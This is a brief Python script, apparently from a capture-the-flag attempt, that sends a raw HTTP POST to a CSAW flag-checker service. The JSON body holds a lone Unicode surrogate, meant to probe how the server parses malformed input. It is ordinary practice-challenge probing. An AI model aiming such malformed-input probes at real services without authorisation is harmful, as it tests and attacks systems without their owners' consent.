import requests, socket
base='http://flagchecker.chal.csaw.io:5000'
u=base+'/check'
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
def raw(body, ctype, tag):
    s=socket.create_connection(('flagchecker.chal.csaw.io',5000), timeout=10)
    req=(f"POST /check HTTP/1.1\r\nHost: flagchecker.chal.csaw.io:5000\r\nUser-Agent: {UA}\r\n"
         f"Content-Type: {ctype}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()+body
    s.sendall(req)
    data=b''
    while True:
        c=s.recv(65536)
        if not c: break
        data+=c
    s.close()
    print('=====', tag, 'len', len(data))
    print(data[:1500].decode('utf-8','replace'))
raw(b'{"flag":"\\ud800"}', 'application/json', 'lone-surrogate-json')
